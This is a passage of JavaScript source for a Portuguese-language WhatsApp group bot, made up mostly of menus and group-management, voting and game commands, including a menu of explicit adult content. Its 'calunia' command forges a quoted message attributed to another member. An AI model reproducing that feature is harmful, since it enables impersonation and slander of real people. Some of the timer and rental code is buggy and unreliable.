                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
caption: alone22,
footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case 'menupesq': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
alone33 = `
┌──⊰「 𝑷𝑬𝑺𝑸𝑼𝑰𝑺𝐴/𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫 」
│
│➢ ${prefix}pinterest [ _nome_ ]
│➢ ${prefix}anime [ _nome_ ]
│➢ ${prefix}happymod [ _nome_ ]
│➢ ${prefix}wikipedia [ _pesquisa_ ]
│➢ ${prefix}play [ _nome da msc_ ]
│➢ ${prefix}play2 [ _nome da msc_ ]
│➢ ${prefix}ytmp3 [ _link da msc_ ]
│➢ ${prefix}ytmp4 [ _link da msc_ ]
│➢ ${prefix}tiktok [ _link_ ]
│➢ ${prefix}igreel [ _link_ ]
│➢ ${prefix}igdl [ _link_ ]
│➢ ${prefix}facebook [ _link_ ]
│➢ ${prefix}fbmp3 [ _link_ ]
│➢ ${prefix}metadinha
│➢ ${prefix}nick [ _nome_ ]
│➢ ${prefix}gimage [ _nome_ ]
│➢ ${prefix}lirik [ _nome da msc_ ]
│➢ ${prefix}mediafire [ _link_ ]
│➢ ${prefix}covid 
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
                    caption: alone33,
                    footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case 'menufun': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
alone4 = `
┌──⊰「 𝑫𝑰𝑽𝑬𝑹𝑺𝐴𝑶 」
│
│➢ ${prefix}akinator
│➢ ${prefix}jogodaforca [ _1/0_ ]
│➢ ${prefix}quando
│➢ ${prefix}morte
│➢ ${prefix}pau
│➢ ${prefix}gay
│➢ ${prefix}chance
│➢ ${prefix}gostoso
│➢ ${prefix}sn
│➢ ${prefix}gadometro
│➢ ${prefix}rr
│➢ ${prefix}dado
│➢ ${prefix}caracoroa
│➢ ${prefix}diga [ _texto_ ]
│➢ ${prefix}fordward [ _texto_ ]
│➢ ${prefix}contar [ _texto_ ]
│➢ ${prefix}tagme
│➢ ${prefix}slot
│➢ ${prefix}amongus [ _@_ ]
│➢ ${prefix}abraço [ _@_ ]
│➢ ${prefix}beijo [ _@_ ]
│➢ ${prefix}perfil
│➢ ${prefix}anagrama [ _1/0_ ]
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
                    caption: alone4,
                    footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case 'alteradores': { 

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
alone5 = `
┌──⊰「 𝐴𝑳𝑻𝑬𝑹𝐴𝑫𝑶𝑹𝑬𝑺 」
│
│➢ ${prefix}bass [ _marque o áudio_ ]
│➢ ${prefix}blown [ _marque o áudio_ ]
│➢ ${prefix}deep [ _marque o áudio_ ]
│➢ ${prefix}earrape [ _marque o áudio_ ]
│➢ ${prefix}fast [ _marque o áudio_ ] 
│➢ ${prefix}fat [ _marque o áudio_ ]
│➢ ${prefix}nightcore [ _marque o áudio_ ]
│➢ ${prefix}reverse [ _marque o áudio_ ] 
│➢ ${prefix}robot [ _marque o áudio_ ]
│➢ ${prefix}slow [ _marque o áudio_ ]
│➢ ${prefix}smooth [ _marque o áudio_ ] 
│➢ ${prefix}tupai [ _marque o áudio_ ]
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
                    caption: alone5,
                    footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case '+18': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
alone6 = `
┌──⊰「 _*+18*_ 」
│
│➢ ${prefix}tentacles
│➢ ${prefix}yuri
│➢ ${prefix}thighs
│➢ ${prefix}bdsm
│➢ ${prefix}foot
│➢ ${prefix}gangbang
│➢ ${prefix}blowjob
│➢ ${prefix}pussy
│➢ ${prefix}panties
│➢ ${prefix}cuckold
│➢ ${prefix}orgy
│➢ ${prefix}ero
│➢ ${prefix}ass
│➢ ${prefix}cum
│➢ ${prefix}ahegao
│➢ ${prefix}femdom
│➢ ${prefix}glasses
│➢ ${prefix}hentai
│➢ ${prefix}jahy
│➢ ${prefix}masturbation
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
                    caption: alone6,
                    footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case 'menulogo': {
alone9 = `
┌──⊰「 𝑳𝑶𝑮𝑶𝑺 」
│
│➢ ${prefix}matrix [ _nome_ ]
│➢ ${prefix}gluetext [ _nome_ ]
│➢ ${prefix}natural [ _nome_ ]
│➢ ${prefix}firework [ _nome_ ]
│➢ ${prefix}dropwater [ _nome_ ]
│➢ ${prefix}foggywindows [ _nome_ ]
│➢ ${prefix}neondevil [ _nome_ ]
│➢ ${prefix}christmas [ _nome_ ]
│➢ ${prefix}3dgradient [ _nome_ ]
│➢ ${prefix}blackpink [ _nome_ ]
│➢ ${prefix}harrypotter [ _nome_ ]
│➢ ${prefix}magma [ _nome_ ]
│➢ ${prefix}berry [ _nome_ ]
│➢ ${prefix}thunder [ _nome_ ]
│➢ ${prefix}transformer [ _nome_ ]
│➢ ${prefix}metallic [ _nome_ ]
│➢ ${prefix}sketch [ _nome_ ]
│➢ ${prefix}fiction [ _nome_ ]
│➢ ${prefix}greenhorror [ _nome_ ]
│➢ ${prefix}space [ _nome_ ]
│➢ ${prefix}halloween [ _nome_ ]
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
                    caption: alone9,
                    footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case 'menucriador': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
alone7 = `
┌──⊰「 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 」
│
│➢ ${prefix}sair
│➢ ${prefix}setpp
│➢ ${prefix}bloquear [ _@_ ]
│➢ ${prefix}desbloquear [ _@_ ]
│➢ ${prefix}blockcmd [ _cmd_ ]
│➢ ${prefix}unblockcmd [ _cmd_ ]
│➢ ${prefix}listblockcmd
│➢ ${prefix}bc 
│➢ ${prefix}chatinfo
│➢ ${prefix}javolto [ _tempo_ ]
│➢ ${prefix}bcgroup
│➢ ${prefix}antipv [ _opção_ ]
│➢ ${prefix}setexif
│➢ ${prefix}setreply
│➢ ${prefix}setfooter
│➢ ${prefix}enquete [ _título|nome1|nome2_ ]
│➢ ${prefix}addcriador [ _55xxxxx_ ]
│➢ ${prefix}delcriador [ _55xxxxx_]
│➢ ${prefix}listacriador
│➢ ${prefix}addrespon [ _pergunta|resposta_ ]
│➢ ${prefix}delrespon [ _nome_ ]
│➢ ${prefix}listrespon
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
caption: alone7,
footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
break
case 'rentbot':
if (!q) return m.reply(`Use :\n*${prefix}sewa* add/del tempo`)
if (args[0] === 'add'){
_sewa.addSewaGroup(from, args[1], sewa)
m.reply(`Sucesso`)
} else if (args[0].toLowerCase() === 'del'){
sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
m.reply(mess.success)
} else {
m.reply(`Use :\n*${prefix}sewa* add/del tempo`)}
break
case 'rentlist': 
case 'rentallist':
let txtnyee = `Lista de Locação\nQuantia : ${sewa.length}\n\n`
for (let i of sewa){
var cekvippsewa = ms(i.expired - Date.now())
txtnyee += `*ID :* ${i.id} \n*Expirar :* ${cekvippsewa.days} dias ${cekvippsewa.hours} horas ${cekvippsewa.minutes} minutos ${cekvipp.seconds} segundos\n\n`
}
m.reply(txtnyee)
break
case 'ceksewa': 
if (!m.isGroup) return m.reply(mess.group)
if (!isSewa) return m.reply(`Este grupo não está listado na lista Sewabot. Digite ${prefix}sewabot para mais informações`)
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
var days = Math.floor(seconds / (60*60) / 24);
var hours = days === 0 ? Math.floor(seconds / (60*60)) : Math.floor(seconds / (60*60) - (24*days));  
var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);


  return `「 *VALIDADE DO ALUGUEL* 」

➸ ID: ${from}
➸ Expira daqui: ${pad(days)} dia(s) ${pad(hours)} hora(s) ${pad(minutes)} minuto(s) ${pad(seconds)} segundo(s)`
}
m.reply(kyun((_sewa.getSewaExpired(from, sewa)-Date.now())/1000))
break
case 'afk': {

 let user = global.db.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = args.join(" ")
 m.reply(`${pushname} agora está Ausente no momento.\nAFK Razão : ${args.join(" ") ? args.join(" ") : ''}`)
 }
 break
case 'javolto':
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!isCreator) return m.reply(mess.dono)
if(!q) return m.reply('𝐒𝐞𝐥𝐞𝐜𝐢𝐨𝐧𝐚𝐫✔︎:*\n𝐬=𝐬𝐞𝐠𝐮𝐧𝐝𝐨𝐬\n𝐦=𝐦𝐢𝐧𝐮𝐭𝐨\n𝐡=𝐇𝐨𝐫𝐚\n\n✫𝐄𝐱𝐞𝐦𝐩𝐥𝐨✫\n10 s')
if (!isCreator) return m.reply('só restrições meu parceiro só pode o alone')
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args[1]=="s") {var timer = args[0]+"000"
} else if (args[1]=="m") {var timer = args[0]+"0000"
} else if (args[1]=="h") {var timer = args[0]+"00000"
} else { return m.reply("𝐒𝐞𝐥𝐞𝐜𝐢𝐨𝐧𝐚𝐫✔︎:*\n𝐬=𝐬𝐞𝐠𝐮𝐧𝐝𝐨𝐬\n𝐦=𝐦𝐢𝐧𝐮𝐭𝐨\n𝐡=𝐇𝐨𝐫𝐚\n\n✫𝐄𝐱𝐞𝐦𝐩𝐥𝐨✫\n10 s")}
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
var nomor = m.participant
m.reply('*_calma ai família, jaja o alone ta de volta_*')
setTimeout( () => {
anya.groupParticipantsUpdate(m.chat, [m.sender], 'add')
}, timer)
await sleep (10000)
anya.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
break
case 'bukatime':
case 'opentime':
case 'abrirgp': 

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !groupOwner) return m.reply(mess.admin)
if (args[1]=="s") {var timer = args[0]+"000"
} else if (args[1]=="m") {var timer = args[0]+"0000"
} else if (args[1]=="h") {var timer = args[0]+"00000"
} else {return m.reply("𝐒𝐞𝐥𝐞𝐜𝐢𝐨𝐧𝐚𝐫✔︎:*\n𝐬=𝐬𝐞𝐠𝐮𝐧𝐝𝐨??\n𝐦=𝐦𝐢𝐧𝐮𝐭𝐨\n𝐡=𝐇𝐨𝐫𝐚\n\n✫𝐄𝐱𝐞𝐦𝐩𝐥𝐨✫\n10 s")}
var nomor = m.participant
m.reply(`o grupo: ${groupMetadata.subject}, será aberto em: ${q}`)
setTimeout(() => {
anya.groupSettingUpdate(m.chat, 'not_announcement')
}, timer)
break
case 'bukatime':
case 'closetime':
case 'fechargp': 

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !groupOwner) return m.reply(mess.admin)
if (args[1]=="s") {var timer = args[0]+"000"
} else if (args[1]=="m") {var timer = args[0]+"0000"
} else if (args[1]=="h") {var timer = args[0]+"00000"
} else {return m.reply("𝐒𝐞𝐥𝐞𝐜𝐢𝐨𝐧𝐚𝐫✔︎:*\n𝐬=𝐬𝐞𝐠𝐮𝐧𝐝𝐨??\n𝐦=𝐦𝐢𝐧𝐮𝐭𝐨\n𝐡=𝐇𝐨𝐫𝐚\n\n✫𝐄𝐱𝐞𝐦𝐩𝐥𝐨✫\n10 s")}
var nomor = m.participant
m.reply(`o grupo: ${groupMetadata.subject}, será fechado em: ${q}`)
setTimeout( () => {
anya.groupSettingUpdate(m.chat, 'announcement')
}, timer)
break
case `calunia`:
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
k = `${body.slice(10)}`
txt1 = k.split("/")[0];
txt2 = k.split("/")[1];
txt3 = k.split("/")[2];
if(!k.includes("/")) return m.reply(`Cade a /\nExemplo: ${prefix + command} @marca-a-pessoa/Fala algo como fosse ele/Reação : nossaa..`)
 anya.sendMessage(m.chat, { text: `${txt3}`}, {quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`,},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
 break
case 'attp':
gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
anya.sendMessage(m.chat, { sticker: gehdhe}, {quoted:m})
break
case 'mudarfoto': {
let media1 = await anya.downloadAndSaveMediaMessage(quoted)
await anya.updateProfilePicture(m.chat, { url: media1 }).catch((err) => fs.unlinkSync(media))
}
break
case 'chatinfo': case 'infochat': {
             
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!isCreator) return m.reply(mess.owner)
                if (!m.quoted) return m.reply('marque a msg')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return m.reply('A mensagem não foi enviada por mim❗')
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += ` @${i.userJid.split(`@`)[0]}\n`
                    teks += ` ┗━ *Tempo :* ${moment(waktu * 1000).format(`DD/MM/YY HH:mm:ss`)}  *Status :* ${read ? `olhou a msg` : `não olhou a msg`}\n\n`
                }
                anya.sendTextWithMentions(m.chat, teks, m)
            }
            break
    case 'setname': case 'setsubject': 	case 'mudarnome': case 'mudanome': case 'setnome': {
	    	    
		    		
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins && !groupOwner) return m.reply(mess.admin)
                if (!text) return m.reply('Insira o nome por favor')
                await anya.groupUpdateSubject(m.chat, text).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            
            break
            case 'setppbot': case 'setbotpp': { 			
if (!isCreator) return m.reply(mess.dono)
if (!quoted) return m.reply(`Enviar/Responder imagem com legenda ${prefix + command}`)
if (!/image/.test(mime)) return replay(`Enviar/Responder imagem com legenda ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Enviar/Responder imagem com legenda ${prefix + command}`)
let media = await anya.downloadAndSaveMediaMessage(quoted)
await anya.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(' sucesso')
}
break
case 'marcar': {
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
               // if (!m.isGroup) return enviar (mess.grup)
//if (!isCreator) return enviar (mess.dono)
              //  if (!isBotAdmins) throw mess.botAdmin
           // if (!isAdmins && !groupOwner) throw mess.admin
let teks = `══ *👥membros!* ══
 
 ➲ *Mensagem: ${q ? q : 'Em Branco'}*\n\n`
                for (let mem of groupMembers) {
                teks += ` @${mem.id.split('@')[0]}\n`
                }
                anya.sendMessage(m.chat, { text: teks, mentions: groupMembers.map(a => a.id) }, { quoted: m})
                }
                break
case 'marcar2': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins && !groupOwner) return m.reply(mess.admin)
               // if (!m.isGroup) return enviar (mess.grup)
//if (!isCreator) return enviar (mess.dono)
              //  if (!isBotAdmins) throw mess.botAdmin
           // if (!isAdmins && !groupOwner) throw mess.admin
let teks = `══ *👥membros!* ══
 
 ➲ *Mensagem: ${q ? q : 'Em Branco'}*\n\n`
                for (let mem of groupMembers) {
                teks += `│➢ https://wa.me/${mem.id.split('@')[0]}\n`
                }
                anya.sendMessage(m.chat, { text: teks, mentions: groupMembers.map(a => a.id) }, { quoted: m })
                }
                break
case 'linkgroup': case 'linkgc': case 'linkgp': case 'linkgrupo': case 'grupolink': case 'getlinkgp': {            	                	    
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!m.isGroup) return m.reply(mess.group)
                let response = await anya.groupInviteCode(m.chat)
               anya.sendMessage(m.chat, {text:`https://chat.whatsapp.com/${response}\n\nLink Do grupo : ${groupMetadata.subject}`})
                 }
            break
case 'criargp': {
if (!isCreator) return m.reply(mess.owner)
if (!args.join(" ")) return m.reply(`use ${prefix+command} nome do gp`)
try {
let cret = await anya.groupCreate(args.join(" "), [])
let response = await anya.groupInviteCode(cret.id)
teks = `     「 Grupo Criado! 」

▸ Nome : ${cret.subject}
▸ Proprietário : @${cret.owner.split("@")[0]}
▸ Criação : ${moment(cret.creation * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss")}

link do gp: [https://chat.whatsapp.com/${response}]
       `
anya.sendMessage(m.chat, { text:teks, mentions: await anya.parseMention(teks)}, {quoted:m})
} catch {
m.reply("Error!")
}
}
break
 case "tictactoe":
      case "jogodavelha":
        if (!m.isGroup) return m.reply(mess.group);
        if (args.length < 1) return m.reply('Marque *"@"* o seu oponente ⚔️');
        if (isTTT)
          return m.reply("Há um jogo neste grupo, por favor aguarde até o jogo acabar ⏰");
        if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null)
          return m.reply('Marque *"@"* o seu oponente ⚔️!')
        ment = m.message.extendedTextMessage.contextInfo.mentionedJid;
        player1 = m.sender;
        player2 = ment[0];
        angka = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"];
        id = m.chat;
        gilir = player2;
        ky_ttt.push({ player1, player2, id, angka, gilir });
        esperandoo = `*🎳 Iniciando O Jogo Da Velha 🎲*

[@${player2.split("@")[0]}] Você está sendo desafiado🔥
Use Y/N Para aceitar, ou correr do desafio...

Nota: use ${prefix}delttt , Para resetar o jogo da velha no grupo, caso o player não responder...!`
        var botão = [
                        { buttonId: `!Y`, buttonText: { displayText: `ACEITAR` }, type: 1 },
                        { buttonId: `!N`, buttonText: { displayText: `RECUSAR` }, type: 1 },                       
                    ]
                    await anya.sendButtonText(m.chat, botão, esperandoo, `${watermark}`, m)
        break
      case "delttt":
      case "delttc":
        if (!m.isGroup) return m.reply(mess.group);
        if (!isTTT) return m.reply("Não há jogos neste grupo");
        naa = ky_ttt.filter((toek) => !toek.id.includes(m.chat));
        ky_ttt = naa;
        m.reply("Game da velha foi resetado neste grupo ☕");
        break;
case 'ping': case 'botstatus': case 'statusbot': case 'status': {
            	    
		    	 	
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `「 ${nomedobot} 」`.trim()
                let buttons = [
                        { buttonId: `blablabla`, buttonText: { displayText: `${nomedobot}` }, type: 1 },                       
                    ]
                    await anya.sendButtonText(m.chat, buttons, respon, `\n🏓Velocidade de Resposta ${latensi.toFixed(4)}  _Segundos_\n\n⏰Tempo online : ${runtime(process.uptime())}`, m)
}
            break
case 'vote': {
            
               //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(mess.endLimit)
            if (!m.isGroup) return m.reply(mess.group)
            if (m.chat in vote) return anya.sendMessage(m.chat, {text: `_Ainda há votos neste chat!_\n\n*${prefix}deletevote* - para deletar votos`})
            if (!text) return anya.sendMessage(m.chat, {text: `Digite o motivo da votação, exemplo: *${prefix + command} alone é lindo*`})
            m.reply(`*A votação começa!*\n\n*${prefix}upvote* - para sim\n*${prefix}devote* - para não\n*${prefix}cekvote* - para verificar o voto\n*${prefix}deletevote* - para deletar voto`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Razão:* ${vote[m.chat][0]}

┏❰UPVOTE ❱
┃ 
┃ Total: ${vote[m.chat][1].length}
┃
┃ 
┗━━━━

┏❰DEVOTE ❱
┃ 
┃ Total: ${vote[m.chat][2].length}
┃
┃ 
┗━━━━`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'VOTAR'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTAR'}, type: 1},
              {buttonId: `${prefix}deletevote`, buttonText: {displayText: 'DELETAR VOTAÇÃO'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: `${watermark}`,
                buttons: buttonsVote,
                headerType: 1
            }
            anya.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
               
               //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(mess.endLimit)
            if (!m.isGroup) return m.reply(mess.group)
            if (!(m.chat in vote)) return anya.sendMessage(m.chat, {text:  `_*sem votação neste grupo!*_\n\n*${prefix}vote* - para começar a votar`})
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return anya.sendMessage(m.chat, {text: 'Você votou'})
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*RAZÃO:* ${vote[m.chat][0]}

┏❰UPVOTE ❱
┃ 
┃ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┃ 
┗━━━━

┏❰DEVOTE ❱
┃ 
┃ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┃ 
┗━━━━`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'VOTAR'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTAR'}, type: 1},
              {buttonId: `${prefix}deletevote`, buttonText: {displayText: 'DELETAR VOTAÇÃO'}, type: 1}
            ]
